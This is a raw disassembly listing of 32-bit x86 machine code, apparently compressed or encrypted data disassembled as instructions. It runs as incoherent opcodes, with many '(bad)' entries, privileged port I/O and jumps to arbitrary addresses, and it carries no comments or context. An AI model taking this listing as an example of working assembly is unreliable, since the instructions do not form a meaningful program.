  4134b0:	fisub  WORD PTR [ebx+0x6447967b]
  4134b6:	adc    al,0x4e
  4134b8:	jl     0x413460
  4134ba:	and    eax,0x10a33e30
  4134bf:	inc    edi
  4134c0:	add    DWORD PTR [ebp+0x50c8a514],0xfffffff2
  4134c7:	xor    eax,ecx
  4134c9:	stc    
  4134ca:	aaa    
  4134cb:	ins    DWORD PTR es:[edi],dx
  4134cc:	inc    edx
  4134cd:	push   cs
  4134ce:	popa   
  4134cf:	mov    al,0xa6
  4134d1:	jle    0x4134b3
  4134d3:	cwde   
  4134d4:	nop
  4134d5:	sbb    edx,eax
  4134d7:	dec    edi
  4134d8:	or     eax,0x664a0bb2
  4134dd:	cld    
  4134de:	dec    ecx
  4134df:	xchg   edx,eax
  4134e0:	out    0x99,al
  4134e2:	fldcw  WORD PTR [ebx-0x41]
  4134e5:	arpl   si,di
  4134e7:	dec    ebx
  4134e8:	inc    ebx
  4134e9:	ja     0x4134bb
  4134eb:	mov    edi,0x5e9197e9
  4134f0:	pop    edx
  4134f1:	je     0x41356b
  4134f3:	fldcw  WORD PTR [ebp-0x5750a203]
  4134f9:	lock jae 0x4134b0
  4134fc:	inc    edi
  4134fd:	inc    ebp
  4134fe:	inc    esp
  4134ff:	pop    edx
  413500:	push   ebp
  413501:	loop   0x4134ba
  413503:	in     eax,0x16
  413505:	pushf  
  413506:	push   cs
  413507:	dec    ebx
  413508:	ss inc edx
  41350a:	pop    ds
  41350b:	xchg   edi,eax
  41350c:	div    BYTE PTR [edx+eiz*2-0x6b5ad95d]
  413513:	pop    esp
  413514:	test   DWORD PTR [edx-0x4beac0be],edx
  41351a:	fstp   TBYTE PTR [eax]
  41351c:	jae    0x413525
  41351e:	adc    al,0x4c
  413520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413521:	(bad)  
  413522:	imul   esi,DWORD PTR [eax+0x52],0x2
  413526:	shl    BYTE PTR [edx-0x31],0xff
  41352a:	popa   
  41352b:	out    dx,eax
  41352c:	xchg   esp,eax
  41352d:	xor    BYTE PTR [edi+0xb],0x9c
  413531:	lahf   
  413532:	inc    esi
  413533:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413534:	cld    
  413535:	inc    esi
  413536:	mov    ebx,0x9a6013ff
  41353c:	mov    ds:0xb5b56677,al
  413541:	aaa    
  413542:	push   cs
  413543:	inc    edi
  413544:	bound  eax,QWORD PTR [edx+esi*8]
  413547:	push   edi
  413548:	dec    esp
  413549:	jo     0x4135c9
  41354b:	popf   
  41354c:	xchg   esi,eax
  41354d:	or     al,0x6b
  41354f:	addr16 out 0xa4,al
  413552:	jp     0x413509
  413554:	cmp    BYTE PTR [ecx-0x2ac306f5],ch
  41355a:	xchg   BYTE PTR [eax-0x5ee3d939],dl
  413560:	dec    eax
  413561:	or     bh,BYTE PTR [ebx+0x72b06138]
  413567:	(bad)  
  413568:	push   ecx
  413569:	ins    DWORD PTR es:[edi],dx
  41356a:	mov    dh,0xf8
  41356c:	push   cs
  41356d:	movups xmm2,XMMWORD PTR [eax]
  413570:	data16 mov ah,0xd5
  413573:	in     al,0xd1
  413575:	or     al,0x5f
  413577:	shr    BYTE PTR [edx-0x39],0x6a
  41357b:	das    
  41357c:	add    bl,BYTE PTR [esp+edx*4-0x1f]
  413580:	mov    eax,0xfba37ba5
  413585:	repz in al,0x50
  413588:	fisttp DWORD PTR [ebx]
  41358a:	shr    BYTE PTR [edx-0x1],1
  41358d:	sub    bh,BYTE PTR [eax-0x51189568]
  413593:	pop    bp
  413595:	xchg   edi,eax
  413596:	xchg   ebx,eax
  413597:	sbb    ebp,ecx
  413599:	mov    DWORD PTR [ecx+0x74],esi
  41359c:	adc    DWORD PTR [edi+eiz*1-0x41fb6519],ebp
  4135a3:	mov    ds:0x9dd1a354,eax
  4135a8:	or     dh,BYTE PTR [eax+esi*4-0x412faf32]
  4135af:	sahf   
  4135b0:	pop    ebp
  4135b1:	and    eax,0x1648e449
  4135b6:	mov    dh,0x8f
  4135b8:	push   edx
  4135b9:	es inc ecx
  4135bb:	mov    edx,0xf3f1a9d7
  4135c0:	adc    ebp,DWORD PTR [eax+0x670c853a]
  4135c6:	sbb    DWORD PTR [esi-0x5],edx
  4135c9:	mov    ebx,esi
  4135cb:	fisttp DWORD PTR [edx]
  4135cd:	push   ecx
  4135ce:	add    al,0x5c
  4135d0:	js     0x41357c
  4135d2:	ja     0x4135de
  4135d4:	pop    edi
  4135d5:	adc    bl,BYTE PTR [ecx-0x62]
  4135d8:	popf   
  4135d9:	popf   
  4135da:	bound  esp,QWORD PTR [ebx+0x28ac9f9a]
  4135e0:	aam    0xbe
  4135e2:	aad    0x59
  4135e4:	stc    
  4135e5:	ds jecxz 0x4135f8
  4135e8:	dec    esi
  4135e9:	xchg   edi,eax
  4135ea:	(bad)  
  4135eb:	cwde   
  4135ec:	jmp    0xb1871c5e
  4135f1:	cmp    esi,DWORD PTR [ecx+edi*1-0x59]
  4135f5:	cld    
  4135f6:	mov    ecx,0x61d33591
  4135fb:	mov    ebp,0x552119e1
  413600:	and    dh,bh
  413602:	add    ch,dl
  413604:	in     eax,0x7c
  413606:	jle    0x413659
  413608:	jle    0x413660
  41360a:	mov    BYTE PTR [esi+0x2],bh
  41360d:	imul   edx,DWORD PTR [ebp-0x60beeaad],0xbfbb3745
  413617:	je     0x4135fe
  413619:	aaa    
  41361a:	adc    al,0x9
  41361c:	mov    bh,0x36
  41361e:	mov    bl,0x75
  413620:	jle    0x4135d5
  413622:	add    ah,dh
  413624:	sub    esi,eax
  413626:	mov    edx,gs
  413628:	cmc    
  413629:	jmp    0x25dd58cf
  41362e:	in     eax,0xd0
  413630:	xchg   ebp,eax
  413631:	jmp    0xd39abc9f
  413636:	int3   
  413637:	dec    esp
  413638:	(bad)  
  413639:	es xchg edi,edi
  41363c:	pop    ds
  41363d:	int3   
  41363e:	sbb    BYTE PTR [ebx-0x18],0x2d
  413642:	mov    WORD PTR [ecx+0x5233ea78],ds
  413648:	mov    esi,0xb15a9811
  41364d:	mov    ebp,0x77306cb1
  413652:	loop   0x4136a2
  413654:	xor    BYTE PTR [ecx+esi*2],cl
  413657:	mov    ds:0x1967a7f6,al
  41365c:	pop    ss
  41365d:	enter  0x3abf,0x36
  413661:	or     ch,BYTE PTR [edi+0x4f]
  413664:	enter  0xf78b,0xad
  413668:	xchg   ecx,eax
  413669:	mov    ebx,0xaf82ddaf
  41366e:	pusha  
  41366f:	rcl    BYTE PTR [esi+0x1daba69],1
  413675:	lds    esi,FWORD PTR [edx+0x24ba3d74]
  41367b:	xchg   esp,eax
  41367c:	dec    esp
  41367d:	pop    esp
  41367e:	ret    
  41367f:	ficom  WORD PTR [esp+eax*8+0x3a]
  413683:	call   0x62c82af8
  413688:	lahf   
  413689:	mov    edx,0x32bc6fe8
  41368e:	push   ds
  41368f:	test   al,0xd4
  413691:	push   esi
  413692:	test   BYTE PTR [eax+0x2a],cl
  413695:	fisub  WORD PTR [edx-0x7648a0a4]
  41369b:	xchg   edi,eax
  41369c:	push   esi
  41369d:	cmp    DWORD PTR [edi+0xf108eb5],ecx
  4136a3:	cmp    DWORD PTR [edx-0x2],esi
  4136a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136a7:	jne    0x413653
  4136a9:	jno    0x4136db
  4136ab:	stos   DWORD PTR es:[edi],eax
  4136ac:	mov    edx,0x852e2162
  4136b1:	cdq    
  4136b2:	loopne 0x4136c9
  4136b4:	hlt    
  4136b5:	push   cs
  4136b6:	mov    dh,0xb2
  4136b8:	aas    
  4136b9:	and    ah,BYTE PTR [edi-0x5b]
  4136bc:	call   0x20eb6b40
  4136c1:	xor    BYTE PTR [edx],bl
  4136c3:	adc    BYTE PTR [ecx+0x574693d],al
  4136c9:	inc    ebx
  4136ca:	(bad)  
  4136cb:	push   0xf
  4136cd:	aas    
  4136ce:	call   0x9e88a9c5
  4136d3:	mov    WORD PTR [ecx+0xd],ss
  4136d6:	mov    ch,0x7d
  4136d8:	std    
  4136d9:	inc    ebp
  4136da:	pop    edx
  4136db:	sub    eax,0xd1c1d45e
  4136e0:	pop    ds
  4136e1:	data16 or al,0xdf
  4136e4:	shl    DWORD PTR [eax+0x54f73ed6],0x68
  4136eb:	sbb    BYTE PTR [edi+0x17],dl
  4136ee:	stos   DWORD PTR es:[edi],eax
  4136ef:	xchg   ebp,eax
  4136f0:	aad    0x33
  4136f2:	cwd    
  4136f4:	js     0x413775
  4136f6:	mov    al,ds:0xc653f950
  4136fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136fc:	mov    ecx,0x6d3e9831
  413701:	enter  0x875a,0x1e
  413705:	pop    ss
  413706:	jae    0x41370a
  413708:	mov    dh,BYTE PTR [esi+0x231d8020]
  41370e:	sbb    eax,0xf350f45
  413713:	fst    DWORD PTR [edx-0x52]
  413716:	leave  
  413717:	icebp  
  413718:	test   BYTE PTR [ebp-0x6a],ah
  41371b:	call   0xc69f26c2
  413720:	fld    TBYTE PTR [ebx]
  413722:	aaa    
  413723:	and    BYTE PTR [edx],cl
  413725:	ss out dx,al
  413727:	pop    esi
  413728:	and    DWORD PTR ds:0x917f110c,edi
  41372e:	adc    ah,BYTE PTR [ebx+ebp*2]
  413731:	and    edi,0x4de9ce21
  413737:	into   
  413738:	int    0xf5
  41373a:	and    BYTE PTR ds:0x404be787,ah
  413740:	stos   BYTE PTR es:[edi],al
  413741:	cmp    cl,BYTE PTR [esp+esi*2+0x1f6fe55e]
  413748:	xchg   esi,eax
  413749:	jbe    0x4136eb
  41374b:	mov    bl,0x2e
  41374d:	sub    DWORD PTR [edx-0x24a3154a],edx
  413753:	mov    al,ds:0x65d5d136
  413758:	jp     0x41372a
  41375a:	mov    edx,0x6f3fdcad
  41375f:	push   0xffffff84
  413761:	xor    al,BYTE PTR [ecx]
  413763:	(bad)  
  413764:	test   al,0x73
  413766:	nop
  413767:	imul   ebp,DWORD PTR [esi],0xfffffff9
  41376a:	(bad)  
  41376b:	adc    esp,esi
  41376d:	fistp  QWORD PTR [edi+edx*8+0x5cceb7ad]
  413774:	lds    ebp,FWORD PTR [edi+edx*8+0x20c07ea7]
  41377b:	daa    
  41377c:	int3   
  41377d:	adc    BYTE PTR ds:0x2b1e9bb5,0x7c
  413784:	mov    esp,0x82cf652c
  413789:	sub    eax,0x4181e41c
  41378e:	sbb    eax,0x84bfe16f
  413793:	rol    DWORD PTR [ebp-0x2c607110],0xd2
  41379a:	ret    0x8b60
  41379d:	stc    
  41379e:	adc    bl,BYTE PTR [eax-0x7d]
  4137a1:	mov    ecx,0xe6eb3420
  4137a6:	jb     0x4137d0
  4137a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137a9:	lods   eax,DWORD PTR ds:[esi]
  4137aa:	mov    dh,0x89
  4137ac:	jbe    0x4137f3
  4137ae:	cmp    BYTE PTR [edi+0x335f3b6d],dh
  4137b4:	jnp    0x413738
  4137b6:	dec    esp
  4137b7:	jb     0x4137c9
  4137b9:	xchg   ebx,eax
  4137ba:	popf   
  4137bb:	adc    al,0x31
  4137bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137be:	cli    
  4137bf:	ss mov edi,0xde3ebfce
  4137c5:	adc    al,BYTE PTR [edi]
  4137c7:	stos   BYTE PTR es:[edi],al
  4137c8:	mov    dh,0x51
  4137ca:	imul   ecx,DWORD PTR [ebp-0x1],0x7c
  4137ce:	jmp    0xecb3ef63
  4137d3:	mov    ebp,DWORD PTR [ebp-0x5297dcb4]
  4137d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137da:	fstp   DWORD PTR ds:0x5470348
  4137e0:	sbb    al,0x15
  4137e2:	cmp    bl,dh
  4137e4:	jo     0x413779
  4137e6:	xor    bl,BYTE PTR [edi+0x724e8936]
  4137ec:	imul   eax,DWORD PTR [eax+0x75accd14],0xbc8023b0
  4137f6:	nop
  4137f7:	mov    eax,esi
  4137f9:	cmc    
  4137fa:	idiv   BYTE PTR [ebx-0x1929084c]
  413800:	push   esp
  413801:	mov    ss,WORD PTR [edi+0x21127390]
  413807:	add    ebp,DWORD PTR [esi+0x1f191757]
  41380d:	xor    eax,0x52c79d16
  413812:	pop    ebp
  413813:	ins    DWORD PTR es:[edi],dx
  413814:	js     0x4137f8
  413816:	mov    edi,0x994eafd1
  41381b:	fisttp WORD PTR [edx+0x2c5f3612]
  413821:	(bad)  
  413824:	jmp    0x375f396c
  413829:	or     eax,0x25beae74
  41382e:	out    dx,al
  41382f:	pop    es
  413830:	sbb    ch,BYTE PTR [edi-0x65]
  413833:	sub    ecx,DWORD PTR ss:[ecx-0x1a]
  413837:	int    0x2f
  413839:	das    
  41383a:	mov    ch,0xd0
  41383c:	in     eax,dx
  41383d:	(bad)  
  41383e:	mov    ecx,0x9c6dfdaf
  413843:	adc    DWORD PTR [ebx],0xfffffff2
  413846:	int3   
  413847:	add    ah,ch
  413849:	jno    0x413892
  41384b:	pushf  
  41384c:	xchg   edx,eax
  41384d:	pushf  
  41384e:	pop    es
  41384f:	push   ss
  413850:	retf   
  413851:	lods   eax,DWORD PTR ds:[esi]
  413852:	call   0xa4c0f111
  413857:	and    ebx,DWORD PTR [edi]
  413859:	jns    0x41383d
  41385b:	lea    esp,[eax+ecx*2+0x3]
  41385f:	(bad)  
  413860:	mov    esi,0x1c56760
  413865:	mov    edx,0x2bfcef05
  41386a:	jno    0x41380a
  41386c:	das    
  41386d:	int3   
  41386e:	outs   dx,DWORD PTR ds:[esi]
  41386f:	aaa    
  413870:	aam    0xeb
  413872:	push   ds
  413873:	inc    eax
  413874:	cmp    ebp,DWORD PTR [edx+eiz*1+0x43c38165]
  41387b:	mov    bh,0x92
  41387d:	test   eax,0xe575152f
  413882:	fbld   TBYTE PTR [ebx+0x42]
  413885:	push   ecx
  413886:	dec    esp
  413887:	(bad)  
  413888:	les    edi,FWORD PTR [edi+0x765ed87e]
  41388e:	push   ds
  41388f:	outs   dx,DWORD PTR ds:[esi]
  413890:	mov    eax,0xd44efa91
  413895:	add    esi,ecx
  413897:	das    
  413898:	iret   
  413899:	in     al,dx
  41389a:	es in  al,dx
  41389c:	dec    edx
  41389d:	mov    al,0x4d
  41389f:	xor    eax,0xf8c0ee56
  4138a4:	dec    esp
  4138a5:	or     edx,DWORD PTR [edi-0x160cacc3]
  4138ab:	pop    edi
  4138ac:	cmc    
  4138ad:	xchg   DWORD PTR [edi],edi
  4138af:	lds    esi,FWORD PTR [esi-0x41080ae5]
  4138b5:	in     eax,0x47
  4138b7:	cmp    eax,0xba08441
  4138bc:	leave  
  4138bd:	adc    al,0x9f
  4138bf:	xor    BYTE PTR [ebp+0x7e21bf86],ch
  4138c5:	cmp    DWORD PTR [edi-0x7c55e45e],ecx
  4138cb:	and    BYTE PTR [edi+0x50],0x84
  4138cf:	adc    al,0xba
  4138d1:	mov    eax,0xf7ea19ff
  4138d6:	retf   
  4138d7:	add    bh,BYTE PTR [edi+ebx*1-0x4619cc5a]
  4138de:	xchg   DWORD PTR [ecx+0x41377c4],edi
  4138e4:	arpl   WORD PTR [ebp+0x60fd7e74],bx
  4138ea:	add    al,0x9c
  4138ec:	xor    BYTE PTR [ebp-0x77f03173],bl
  4138f2:	sahf   
  4138f3:	adc    ebx,DWORD PTR [edi]
  4138f5:	cmc    
  4138f6:	pushf  
  4138f7:	nop
  4138f8:	pop    edi
  4138f9:	pop    ebx
  4138fa:	in     al,dx
  4138fb:	int3   
  4138fc:	ret    
  4138fd:	imul   eax,DWORD PTR [edx+0x36],0xc9f7f50b
  413904:	es aad 0x3c
  413907:	sbb    bl,BYTE PTR fs:[edx+0x15]
  41390b:	jb     0x4138f4
  41390d:	and    eax,0x16597eac
  413912:	xchg   ebx,eax
  413913:	neg    BYTE PTR [ebx-0x1e079efe]
  413919:	inc    edi
  41391a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41391b:	enter  0x132c,0x53
  41391f:	add    eax,0xd8341bf4
  413924:	in     al,0x98
  413926:	sti    
  413927:	test   eax,0x332f0bad
  41392c:	test   BYTE PTR [edi],al
  41392e:	out    dx,eax
  41392f:	inc    esi
  413930:	ins    BYTE PTR es:[edi],dx
  413931:	jg     0x413978
  413933:	aas    
  413934:	loopne 0x41396a
  413936:	add    al,BYTE PTR [eax]
  413938:	not    DWORD PTR [ebp+0x3b]
  41393b:	aad    0x91
  41393d:	inc    esi
  41393e:	or     al,0x6b
  413940:	mov    ecx,0xc25cfab
  413945:	hlt    
  413946:	gs or  eax,ebp
  413949:	mov    esi,0xefcd7e36
  41394e:	dec    ebx
  41394f:	dec    eax
  413950:	enter  0x770d,0x77
  413954:	sbb    bl,al
  413956:	in     eax,dx
  413957:	inc    esp
  413958:	imul   edi,DWORD PTR [ecx],0x9
  41395b:	(bad)  
  41395c:	(bad)  
  41395d:	sub    edi,DWORD PTR ds:0x165f47a4
  413963:	(bad)  
  413964:	fmul   DWORD PTR [edi+eax*8-0xe]
  413968:	in     eax,dx
  413969:	in     eax,0x39
  41396b:	mov    ebp,0x56977c5d
  413970:	xlat   BYTE PTR ds:[ebx]
  413971:	arpl   WORD PTR ds:0x99a4bff8,dx
  413977:	pop    esi
  413978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413979:	jg     0x4139e8
  41397b:	mov    bh,bh
  41397d:	aaa    
  41397e:	loope  0x4139fb
  413980:	add    DWORD PTR [esp+ebp*1-0x56],esp
  413984:	cmp    BYTE PTR [eax-0x29c1eb0],dl
  41398a:	hlt    
  41398b:	mov    ebp,0x895413a1
  413990:	in     al,0xb4
  413992:	(bad)  
  413993:	push   ds
  413994:	in     eax,0xb7
  413996:	mov    dl,0x69
  413998:	stc    
  413999:	adc    eax,0x12a3b6cc
  41399e:	jg     0x41397b
  4139a0:	rol    BYTE PTR [edi],cl
  4139a2:	mov    esi,0x48fd2198
  4139a7:	stos   DWORD PTR es:[edi],eax
  4139a8:	dec    esp
  4139a9:	repnz pusha 
  4139ab:	neg    DWORD PTR [edi+0x275131af]
  4139b1:	mov    ch,0xae
  4139b3:	scas   al,BYTE PTR es:[edi]
  4139b4:	nop
  4139b5:	popf   
  4139b6:	into   
  4139b7:	mov    eax,ds:0x8cc78723
  4139bc:	ja     0x413a3d
  4139be:	int    0x6c
  4139c0:	(bad)  
  4139c1:	mov    cl,0x43
  4139c3:	jl     0x4139eb
  4139c5:	mov    ds:0x32486005,al
  4139ca:	out    dx,al
  4139cb:	mov    esp,0x1a369d7f
  4139d0:	neg    DWORD PTR [eax]
  4139d2:	adc    BYTE PTR [esi-0x29771c25],al
  4139d8:	in     al,0xcb
  4139da:	hlt    
  4139db:	sbb    dh,BYTE PTR [ecx+0x336c2833]
  4139e1:	les    esi,FWORD PTR [ecx+ebx*2-0x7c]
  4139e5:	xchg   esp,eax
  4139e6:	test   eax,0x9101b106
  4139eb:	mov    WORD PTR [ecx],gs
  4139ed:	adc    al,ch
  4139ef:	fwait
  4139f0:	int3   
  4139f1:	mov    WORD PTR [ebp+ecx*8+0x79],es
  4139f5:	lods   eax,DWORD PTR ds:[esi]
  4139f6:	and    BYTE PTR [eax],0x57
  4139f9:	fwait
  4139fa:	sahf   
  4139fb:	and    edx,DWORD PTR [edi]
  4139fd:	and    al,0x15
  4139ff:	jl     0x413a1c
  413a01:	and    BYTE PTR [ecx-0x5539fa86],bh
  413a07:	sub    BYTE PTR [ebx-0x5a],bh
  413a0a:	into   
  413a0b:	pop    ebx
  413a0c:	sub    cl,BYTE PTR [edi-0x72]
  413a0f:	cmp    eax,0x27182740
  413a14:	push   cs
  413a15:	mov    ah,0x5c
  413a17:	xchg   ebp,eax
  413a18:	mov    ebx,0x4fcf504a
  413a1d:	pusha  
  413a1e:	pop    es
  413a1f:	scas   al,BYTE PTR es:[edi]
  413a20:	push   esi
  413a21:	adc    al,BYTE PTR [ebx-0x3e]
  413a24:	call   0x7e3f:0xf9a7974b
  413a2b:	mov    bh,0xe1
  413a2d:	push   0xa25d5c0
  413a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a33:	sbb    BYTE PTR [ecx+0x16b83670],al
  413a39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a3a:	popa   
  413a3b:	out    dx,al
  413a3c:	push   0xfffffffc
  413a3e:	retf   0xec45
  413a41:	outs   dx,BYTE PTR ds:[esi]
  413a42:	push   ebx
  413a43:	es sub ch,dl
  413a46:	jmp    0x4139eb
  413a48:	aaa    
  413a49:	xchg   ebx,eax
  413a4a:	sbb    BYTE PTR [ecx-0x583f6bbf],ah
  413a50:	cmp    al,cl
  413a52:	icebp  
  413a53:	push   ebx
  413a54:	inc    eax
  413a55:	mov    ds:0xc7155ae4,al
  413a5a:	push   ss
  413a5b:	inc    ebp
  413a5c:	push   ecx
  413a5d:	cmc    
  413a5e:	push   edi
  413a5f:	leave  
  413a60:	sub    eax,0x5497a92c
  413a65:	sub    DWORD PTR ds:0x3c6d2f40,0x52
  413a6c:	stos   BYTE PTR es:[edi],al
  413a6d:	and    DWORD PTR [esi-0x4ba55101],ebx
  413a73:	cdq    
  413a74:	(bad)  
  413a75:	sub    eax,0xd1afc627
  413a7a:	jmp    0x5f3a79bd
  413a7f:	lods   al,BYTE PTR ds:[esi]
  413a80:	repz fidivr DWORD PTR [ebx-0x10]
  413a84:	pop    es
  413a85:	not    BYTE PTR [edx]
  413a87:	cmc    
  413a88:	popf   
  413a89:	out    0xa6,eax
  413a8b:	pop    edx
  413a8c:	add    edx,DWORD PTR [eax]
  413a8e:	ins    BYTE PTR es:[edi],dx
  413a8f:	jecxz  0x413a66
  413a91:	and    al,0x81
  413a93:	das    
  413a94:	xor    ebp,DWORD PTR [ebx-0x42021ad5]
  413a9a:	ficomp DWORD PTR [ebp+0x76c7fa20]
  413aa0:	enter  0x97fc,0x82
  413aa4:	pop    esi
  413aa5:	inc    ebp
  413aa6:	sahf   
  413aa7:	ss sub eax,0x5b0775b7
  413aad:	xor    edi,DWORD PTR [esi+0x1c]
  413ab0:	mov    cl,0xdb
  413ab2:	test   eax,0xd211b8a2
  413ab7:	aas    
  413ab8:	sbb    al,0x18
  413aba:	mov    ds:0xb112a419,eax
  413abf:	dec    esp
  413ac0:	stos   DWORD PTR es:[edi],eax
  413ac1:	adc    ah,BYTE PTR [edi-0x193b9ca3]
  413ac7:	mov    ah,0x57
  413ac9:	aaa    
  413aca:	in     al,dx
  413acb:	stos   BYTE PTR es:[edi],al
  413acc:	sbb    DWORD PTR [ecx],esi
  413ace:	adc    al,0xbf
  413ad0:	xor    DWORD PTR [esi],eax
  413ad2:	outs   dx,BYTE PTR ds:[esi]
  413ad3:	out    0xf7,al
  413ad5:	inc    ecx
  413ad6:	add    BYTE PTR [esi+ebp*2+0x2e],al
  413ada:	retf   
  413adb:	(bad)  
  413add:	(bad)  
  413ade:	or     al,0x1f
  413ae0:	jmp    0x413a66
  413ae2:	aaa    
  413ae3:	test   al,0x16
  413ae5:	sbb    eax,0xf2f88473
  413aea:	jno    0x413b4c
  413aec:	or     ah,cl
  413aee:	je     0x413b33
  413af0:	jno    0x413b26
  413af2:	icebp  
  413af3:	sub    dl,BYTE PTR [edi+0x5051091a]
  413af9:	fcomp  QWORD PTR fs:[edx]
  413afc:	in     eax,dx
  413afd:	in     eax,0xfe
  413aff:	sub    eax,0x26d6b716
  413b04:	mov    DWORD PTR [ecx+0x576081c],ebp
  413b0a:	gs sbb esp,ebp
  413b0d:	xor    eax,0xcf70338d
  413b12:	inc    ecx
  413b13:	xchg   esi,eax
  413b14:	cwde   
  413b15:	sub    BYTE PTR [edi-0x49],dh
  413b18:	jl     0x413b41
  413b1a:	(bad)  
  413b1b:	mov    ebp,0xf3c456b6
  413b20:	lds    esi,FWORD PTR ds:0x149fa5dd
  413b26:	sbb    al,0x39
  413b28:	adc    edx,DWORD PTR [ecx+0x34]
  413b2b:	xlat   BYTE PTR ds:[ebx]
  413b2c:	ret    0xdd23
  413b2f:	stos   DWORD PTR es:[edi],eax
  413b30:	fst    st(0)
  413b32:	jle    0x413b1a
  413b34:	pusha  
  413b35:	loop   0x413afd
  413b37:	les    esi,FWORD PTR [ebp+0x2b61cd42]
  413b3d:	or     eax,0xde5b1b82
  413b42:	nop
  413b43:	pusha  
  413b44:	int    0xc5
  413b46:	std    
  413b47:	dec    edi
  413b48:	jecxz  0x413b2c
  413b4a:	je     0x413bba
  413b4c:	xor    dh,BYTE PTR [ebx+0x21]
  413b4f:	dec    esp
  413b50:	mov    ebx,DWORD PTR [eax]
  413b52:	jnp    0x413ba6
  413b54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b55:	push   esi
  413b56:	out    0x69,eax
  413b58:	dec    edi
  413b59:	and    dh,BYTE PTR [ecx+0x28aee7fc]
  413b5f:	pusha  
  413b60:	and    cl,BYTE PTR [edx+ebx*1]
  413b63:	xor    bh,al
  413b65:	lock xchg eax,ecx
  413b68:	mov    DWORD PTR [ebx+ebx*8+0x778b3532],esi
  413b6f:	mov    ebp,0x71d0f47a
  413b74:	popa   
  413b75:	nop/reserved BYTE PTR [edi-0x1f]
  413b79:	xchg   edx,eax
  413b7a:	mov    esp,0x32778d48
  413b7f:	dec    ebx
  413b80:	iret   
  413b81:	fimul  DWORD PTR [ecx]
  413b83:	fsub   st,st(2)
  413b85:	xchg   edx,eax
  413b86:	adc    dl,BYTE PTR [ebp+0x1d]
  413b89:	ror    BYTE PTR [eax],1
  413b8b:	xor    eax,0xf0594027
  413b90:	stos   BYTE PTR es:[edi],al
  413b91:	cmp    ch,BYTE PTR [eax+0x710a5d59]
  413b97:	outs   dx,BYTE PTR ds:[esi]
  413b98:	(bad)  
  413b99:	adc    eax,0x32bd683a
  413b9e:	pop    esi
  413b9f:	(bad)  
  413ba0:	ins    BYTE PTR es:[edi],dx
  413ba1:	popf   
  413ba2:	call   0x2285:0x7c5549ab
  413ba9:	xor    DWORD PTR [ebx],ecx
  413bab:	fwait
  413bac:	push   0xffffffb3
  413bae:	inc    esi
  413baf:	push   edx
  413bb0:	pop    esp
  413bb1:	or     ah,BYTE PTR [ebx+ebx*8-0x2e]
  413bb5:	lea    eax,[esi+0x3f1b7fc2]
  413bbb:	(bad)  
  413bbc:	ror    dl,cl
  413bbe:	je     0x413bd2
  413bc0:	cwde   
  413bc1:	pop    ds
  413bc2:	push   ebp
  413bc3:	inc    eax
  413bc4:	and    dl,cl
  413bc6:	xor    BYTE PTR [esi-0x1a],cl
  413bc9:	or     al,0x6d
  413bcb:	add    eax,0x838bc125
  413bd0:	cld    
  413bd1:	jbe    0x413b8a
  413bd3:	add    al,BYTE PTR [ebx]
  413bd5:	scas   al,BYTE PTR es:[edi]
  413bd6:	pusha  
  413bd7:	mov    eax,ds:0x1ed8649c
  413bdc:	inc    ecx
  413bdd:	(bad)  
  413bde:	out    dx,al
  413bdf:	push   ebp
  413be0:	mul    DWORD PTR [ebp+0x16]
  413be3:	fsubr  DWORD PTR [eax+0x6f6a8495]
  413be9:	mov    DWORD PTR [esi],ecx
  413beb:	aaa    
  413bec:	div    DWORD PTR [ecx+ebp*4-0x3ea3acf]
  413bf3:	push   ecx
  413bf4:	iret   
  413bf5:	jmp    0x2d0a:0x4b0ba8b
  413bfc:	sbb    al,0x8d
  413bfe:	and    DWORD PTR [eax+0x365b3af],0x5f99ac75
  413c08:	retf   0x6c9c
  413c0b:	in     al,0x1f
  413c0d:	push   ds
  413c0e:	pop    edx
  413c0f:	sub    DWORD PTR [eax-0x13],esp
  413c12:	jmp    0x413c70
  413c14:	cld    
  413c15:	inc    eax
  413c16:	cdq    
  413c17:	(bad)  
  413c18:	mov    dl,0xc4
  413c1a:	mov    esi,0xba16b435
  413c1f:	ins    DWORD PTR es:[edi],dx
  413c20:	out    dx,al
  413c21:	dec    edi
  413c22:	pop    ecx
  413c23:	adc    ebp,eax
  413c25:	scas   eax,DWORD PTR es:[edi]
  413c26:	leave  
  413c27:	sar    BYTE PTR [edi],0x1b
  413c2a:	xlat   BYTE PTR ds:[ebx]
  413c2b:	clc    
  413c2c:	push   es
  413c2d:	jge    0x413bfa
  413c2f:	ins    BYTE PTR es:[edi],dx
  413c30:	mov    al,ds:0xb4a680c5
  413c35:	mov    al,ds:0x7b6f0b5d
  413c3a:	xchg   esp,eax
  413c3b:	fistp  DWORD PTR [esi-0x17]
  413c3e:	xlat   BYTE PTR ds:[ebx]
  413c3f:	rcr    BYTE PTR [ebp-0x2f],1
  413c42:	cs pop ecx
  413c44:	sub    al,0xb4
  413c46:	pop    esp
  413c47:	xchg   ebx,eax
  413c48:	addr16 pop ds
  413c4a:	and    DWORD PTR [edi+0x31],eax
  413c4d:	pusha  
  413c4e:	je     0x413cba
  413c50:	js     0x413c48
  413c52:	es pop ss
  413c54:	mov    edi,0x30c8ce7
  413c59:	lahf   
  413c5a:	mov    ecx,0x569e6157
  413c5f:	cmc    
  413c60:	cmc    
  413c61:	bound  edx,QWORD PTR [edi]
  413c63:	adc    eax,DWORD PTR ds:0xbac5e62f
  413c69:	adc    esi,ebx
  413c6b:	pop    edx
  413c6c:	push   ds
  413c6d:	jmp    0x413cc0
  413c6f:	add    BYTE PTR ds:0x2551833b,0x8e
  413c76:	pop    ebp
  413c77:	or     bh,bl
  413c79:	data16 arpl WORD PTR [ebx],bx
  413c7c:	sbb    DWORD PTR [esi],ebx
  413c7e:	mul    DWORD PTR [ecx]
  413c80:	mov    ch,0x78
  413c82:	and    bl,al
  413c84:	mov    eax,ds:0xae5b6de3
  413c89:	sub    ecx,0x5b
  413c8c:	sbb    al,BYTE PTR [edx]
  413c8e:	pop    eax
